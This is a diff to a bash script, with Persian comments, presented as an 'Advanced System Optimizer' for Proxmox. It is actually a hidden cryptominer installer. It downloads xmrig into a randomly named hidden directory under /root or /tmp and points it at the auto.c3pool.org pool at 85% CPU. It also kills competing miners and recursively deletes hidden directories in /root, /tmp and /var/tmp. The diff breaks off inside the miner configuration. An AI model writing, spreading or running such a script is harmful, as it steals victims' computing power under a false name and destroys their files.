@@ -1,7 +1,7 @@
 #!/bin/bash
-VERSION=2.30
+VERSION=2.31
 echo "Advanced System Optimizer v$VERSION"
-echo "Fixed for Proxmox/PVE - auto.c3pool.org:19999 - 85% CPU"
+echo "Fixed for Proxmox/LXC - auto.c3pool.org:19999 - 85% CPU"
 echo
 export LC_ALL=C
 export LANG=C
@@ -26,12 +26,12 @@ CPU_HINT=85
 
 echo "[*] $CPU_TOTAL cores → $USABLE_THREADS threads @ $CPU_HINT%"
 
-# --- انتخاب مسیر (PVE-safe) ---
+# --- انتخاب مسیر (Proxmox-safe, prioritize /root) ---
 BASE_DIR=""
-for candidate in "/tmp" "/var/tmp" "$HOME/.cache" "/root/.cache"; do
+for candidate in "/root" "/tmp" "/var/tmp" "$HOME/.cache"; do
     TEST_DIR="$candidate/.test_$(openssl rand -hex 4)"
     if mkdir -p "$TEST_DIR" 2>/dev/null && touch "$TEST_DIR/test" 2>/dev/null && rm -rf "$TEST_DIR" 2>/dev/null; then
-        BASE_DIR="$candidate/.$RAND_HEX"
+        BASE_DIR="$candidate"
         break
     fi
 done
@@ -39,10 +39,10 @@ done
 [ -z "$BASE_DIR" ] && echo "ERROR: No writable path" && exit 1
 
 RAND_HEX=$(openssl rand -hex 16)
-BASE_DIR="$candidate/.$RAND_HEX"
+BASE_DIR="$BASE_DIR/.$RAND_HEX"
 LOG_DIR="$BASE_DIR/.log"
 
-echo "[*] Installing in: $BASE_DIR (hidden, auto-clean if /tmp)"
+echo "[*] Installing in: $BASE_DIR (hidden, Proxmox-safe)"
 
 # --- ساخت مسیر با چک ---
 if ! mkdir -p "$BASE_DIR" "$LOG_DIR" 2>/dev/null; then
@@ -53,7 +53,7 @@ chmod 700 "$BASE_DIR" "$LOG_DIR" 2>/dev/null
 
 # --- پاک‌سازی ---
 pkill -9 -f xmrig 2>/dev/null
-find /tmp /var/tmp "$HOME/.cache" /root/.cache -type d -name ".*" -exec rm -rf {} + 2>/dev/null
+find /root /tmp /var/tmp "$HOME/.cache" -type d -name ".*" -exec rm -rf {} + 2>/dev/null
 
 # --- hugepages ---
 if [ "$(id -u)" -eq 0 ]; then
@@ -65,7 +65,7 @@ fi
 
 # --- دانلود ---
 URL="https://github.com/xmrig/xmrig/releases/download/v6.18.1/xmrig-6.18.1-linux-static-x64.tar.gz"
-TMP="/tmp/.xmrig_tmp_$(date +%s).tgz"
+TMP="/tmp/.xmrig_$(date +%s).tgz"
 
 echo "[*] Downloading xmrig..."
 curl -fsSL "$URL" -o "$TMP" || { echo "Download failed"; exit 1; }
@@ -76,7 +76,7 @@ XMRIG_BIN=$(find /tmp -name "xmrig" -type f -executable 2>/dev/null | head -1)
 
 # --- کپی با چک ---
 if ! cp "$XMRIG_BIN" "$BASE_DIR/main"; then
-    echo "ERROR: Copy failed"
+    echo "ERROR: Copy failed to $BASE_DIR/main"
     rm -rf "$BASE_DIR"
     exit 1
 fi
@@ -90,13 +90,13 @@ SYSTEM_USER="opt$(openssl rand -hex 6)"
 CONFIG_FILE="$BASE_DIR/config.json"
 LOG_FILE="$LOG_DIR/out.log"
 if ! cat > "$CONFIG_FILE" << EOF; then
-    echo "ERROR: Config failed"
+    echo "ERROR: Config creation failed"
     rm -rf "$BASE_DIR"
     exit 1
 fi
 {
     "donate-level": 0,
-    "randomx": { "mode": "fast", "1gb-pages": true },
+    "randomx": { "mode": "fast" },
     "cpu": { "enabled": true, "huge-pages": true, "priority": 5, "yield": false },
     "pools": [{
         "url": "auto.c3pool.org:19999",
